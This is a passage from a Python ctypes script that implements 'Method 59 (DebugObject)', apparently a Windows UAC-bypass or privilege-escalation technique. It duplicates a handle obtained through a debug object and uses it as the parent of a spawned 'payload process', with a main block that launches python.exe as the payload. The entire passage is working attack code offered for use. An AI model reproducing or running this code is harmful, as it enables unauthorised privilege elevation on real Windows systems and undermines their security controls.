                kernel32.GetProcessId.argtypes = [HANDLE]
                kernel32.GetProcessId.restype = ctypes.c_ulong
                pid = kernel32.GetProcessId(dup_handle)
                if log:
                    print(f'[*] Process ID from duplicated handle: {pid}')
                (success, _) = create_process_with_parent(dup_handle.value, executable, win_dir)
                if success:
                    if log:
                        print(f'[+] Method 59 (DebugObject): Success')
                elif log:
                    print(f'[-] Failed to create payload process: {kernel32.GetLastError()}')
                ntdll.NtClose(dup_handle)
            elif log:
                print(f'[-] NtDuplicateObject failed: 0x{(status & 4294967295):08X}')
        if debugObjectSet:
            ntdll.DbgUiSetThreadDebugObject(HANDLE(0))
        if dbgHandle.value:
            ntdll.NtClose(dbgHandle)
        if procInfo.hThread:
            kernel32.CloseHandle(procInfo.hThread)
        if procInfo.hProcess:
            kernel32.TerminateProcess(procInfo.hProcess, 0)
            kernel32.CloseHandle(procInfo.hProcess)
        if (dbgProcessHandle and success):
            return 0
        if log:
            print('[-] Method 59: Failed to complete')
        return 1
    except Exception as e:
        if log:
            print(f'[-] Method 59 exception: {e}')
        import traceback
        traceback.print_exc()
        return 1
if (__name__ == '__main__'):
    print(f'[*] Method: 59, Payload: python.exe')
    sys.exit(method59("python.exe"))